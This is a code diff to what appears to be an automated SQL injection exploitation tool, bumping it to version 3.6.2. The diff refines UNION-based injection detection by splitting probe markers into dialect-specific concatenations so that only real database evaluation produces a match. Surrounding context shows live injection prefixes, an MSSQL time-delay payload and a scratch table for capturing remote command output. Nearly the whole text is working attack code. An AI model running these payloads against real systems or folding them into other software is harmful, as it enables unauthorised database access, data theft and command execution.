@@ -70,7 +70,7 @@ RCE_TABLE = "bf_rce"              # scratch table that captures command output
 UMARK = "bfUc"                   # UNION column-reflection probe
 ULEFT, URIGHT = "bfUL", "bfUR"   # markers wrapped around a UNION-extracted value
 
-VERSION = "3.6.1"
+VERSION = "3.6.2"
 _RED, _RESET = "\033[1;31m", "\033[0m"   # bold red
 _ART = r"""
  ____  _      _____ _   _ _____  ______ ____  _      _____
@@ -142,6 +142,8 @@ class Dbms:
     union_from = ""                   # extra FROM a UNION SELECT needs (Oracle: " FROM dual")
     def union_wrap(self, qexpr, left, right):     # wrap a scalar: left || value || right
         return f"'{left}'||({qexpr})||'{right}'"
+    def concat_parts(self, parts):                # concat string literals in this dialect
+        return "||".join(f"'{p}'" for p in parts)
 
     # --- schema mapping queries (override per DBMS) ---
     list_sep = ","
@@ -224,6 +226,8 @@ class MySQL(Dbms):
     def quote_ident(self, name): return "`" + name.replace("`", "``") + "`"
     def union_wrap(self, qexpr, left, right):
         return f"concat('{left}',({qexpr}),'{right}')"
+    def concat_parts(self, parts):
+        return "concat(" + ",".join(f"'{p}'" for p in parts) + ")"
     def q_count(self, t): return f"SELECT cast(count(*) as char) FROM {self.quote_ident(t)}"
     def q_current_db(self): return "SELECT database()"
     def q_tables(self):
@@ -248,6 +252,8 @@ class MSSQL(Dbms):
     def quote_ident(self, name): return "[" + name.replace("]", "]]") + "]"
     def union_wrap(self, qexpr, left, right):
         return f"'{left}'+CAST(({qexpr}) AS varchar(8000))+'{right}'"
+    def concat_parts(self, parts):
+        return "+".join(f"'{p}'" for p in parts)
     def sleep_stacked(self, cond, sleep):
         return f"IF ({cond}) WAITFOR DELAY '0:0:{max(1, int(round(sleep)))}'"
     def error_expr(self, inner):
@@ -734,12 +740,16 @@ def find_error(target, a, contexts, candidates):
 
 
 def find_union(target, a, dbms):
-    """Detect a reflected UNION injection: discover column count + which column echoes."""
+    """Detect a reflected UNION injection: discover column count + which column echoes.
+    Each probe value is emitted as a SPLIT concatenation (e.g. 'bf'||'Uc1z'); the marker
+    only appears CONTIGUOUSLY in the response if the database actually evaluated it. A
+    visible-error page that merely echoes our payload shows the split form and won't match,
+    so error-reflecting targets no longer false-positive as union-based."""
     prefixes = [("' AND 1=2 UNION SELECT ", "string"), ("-1 UNION SELECT ", "numeric")]
     for prefix, label in prefixes:
         for n in range(1, a.union_cols + 1):
             marks = [f"{UMARK}{i}z" for i in range(1, n + 1)]
-            cols = ",".join(f"'{mk}'" for mk in marks)
+            cols = ",".join(dbms.concat_parts((mk[:2], mk[2:])) for mk in marks)
             text = target.send(f"{prefix}{cols}{dbms.union_from}{dbms.comment}").text
             for i, mk in enumerate(marks, 1):
                 if mk in text:
